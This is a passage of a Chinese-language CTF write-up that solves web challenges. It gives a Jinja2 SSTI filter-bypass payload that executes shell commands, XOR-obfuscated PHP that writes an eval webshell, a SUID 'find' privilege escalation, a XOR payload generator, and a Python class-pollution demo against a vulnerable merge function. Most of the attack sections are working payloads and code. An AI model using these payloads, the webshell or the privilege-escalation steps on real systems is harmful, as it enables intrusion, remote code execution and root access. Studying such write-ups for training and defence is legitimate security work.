<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br></pre></td></tr></table></figure>



<p>需要<code>cat app.py</code>,字母和空格都有了，现在构造<code>.</code>又成了一个难点，但还是有方法的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(g)%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;flask.g of &#x27;app&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> dian=(g|string|<span class="built_in">list</span>)|attr(po)(<span class="number">6</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(dian)%&#125;</span><br><span class="line"><span class="comment">#.</span></span><br></pre></td></tr></table></figure>

<p>ok，这样所需要的字符都构造出来了，剩下的就是利用了</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> kon=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">17</span>)%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> dian=(g|string|<span class="built_in">list</span>)|attr(po)(<span class="number">6</span>)%&#125;   	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> qian=<span class="built_in">dict</span>(p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> hou=<span class="built_in">dict</span>(p=a,y=b)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ming=(kon,kon,<span class="built_in">dict</span>(ap=a,p=b)|join,dian,hou)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(<span class="built_in">dict</span>(ca=a,t=b)|join,ming)|join()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">117</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bb=(a|string|<span class="built_in">list</span>)|attr(po)(<span class="number">246</span>)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> ho=(<span class="built_in">dict</span>(ap=a,p=b))|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> fl=(<span class="built_in">dict</span>(fl4gfl4g=a,fl4g=b))|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span>  cmd=(<span class="built_in">dict</span>(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">117</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)())%&#125;</span><br></pre></td></tr></table></figure>





<h2 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先用bp fuzz一下，看看过滤了什么，发现异或符号没有过滤，而且有几个字母没有过滤</p>
<p>下面是上了木马才得到源码的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="异或上🐎"><a href="#异或上🐎" class="headerlink" title="异或上🐎"></a>异或上🐎</h3><p>因为没有过滤异或所以构造phpinfo(); : (“^@^@@[@”^”.(.).&#x3D;&#x2F;“)();</p>
<p>发现是可以成功显示phpinfo内容，但是查看disable_functions禁用了一些函数，但是没有禁用file_put_contents函数，尝试写一句话木马上去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_content(&quot;lll.php&quot;,&quot;&lt;?php eval($_POST[1])?&gt;&quot;)</span><br><span class="line"></span><br><span class="line">(&quot;AAAAaL*VaAAAVAAVL&quot;^&quot;&#x27;(-$&gt;&lt;_\&quot;&gt;\&quot;./\&quot;$/\&quot;?&quot;)(&quot;lll&quot;.&quot;.&quot;.(&quot;LAL&quot;^&quot;&lt;)&lt;&quot;),(&quot;aaLALaaAVAAvaalalvelaleaa&quot;^&quot;]^&lt;)&lt;A!$  -^E&gt;&lt;.?\&quot;&gt;]&lt;E^^_&quot;));</span><br></pre></td></tr></table></figure>

<p>发现也是成功上传了木马，用蚁剑连shell(这里有一个坑,https没有成功，用http代替就可以了)</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>可以看到flag就在根目录下，但是没有权限读取，whoami 查看当前用户www-data，去网上搜一次关于提权的知识，</p>
<p>提权的方法有很多，这道题考的是find提权，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">which find </span><br><span class="line">#/usr/bin/find</span><br><span class="line"></span><br><span class="line">ls /usr/bin/find -l</span><br><span class="line">#-rwsr-xr-x. 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line">#这里发现有s权限 s:suodsetuid：该位是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令</span><br><span class="line"></span><br><span class="line"> find /etc/passwd -exec cat /flag \;</span><br><span class="line"> #find 一个必须存在的文件 -exec 有执行的命令 \;</span><br></pre></td></tr></table></figure>

<p>到这里flag就已经到手了，踩了很多坑，还有一些坑没有写上了，也是拿了一个三血，下面是异或的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;alevALEV!@$%^*()[];\&#x27;\&quot;,.&lt;&gt;/?-=_` &quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入进行异或构造的字符串：&quot;</span>))</span><br><span class="line"><span class="comment"># answer = &quot;//\/\/&quot;</span></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">        tmp1 += i</span><br><span class="line">        tmp2 += j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;连用户名密码都没有你注册啥呢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;泰酷辣,没有注册成功捏&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;你的数字不对哦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;先登录去&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>考察原型链污染和python的int函数漏洞，其实int不止在python里有这个漏洞，其他语言也有，比如php也有；</p>
<p>标志着原型链污染</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>

<p>虽然代码一共有100多行，但是整个代码的逻辑和实现的功能是非常简单易懂的</p>
<p>使得hhh类的isvip为真，但是hhh没有isvip属性，很明显就是需要污染hhh类，</p>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>先看一个python原型链污染的简单案例吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;no way&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="pollute"><a href="#pollute" class="headerlink" title="pollute"></a>pollute</h3><p>然后下面是我自己本地测试的结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title 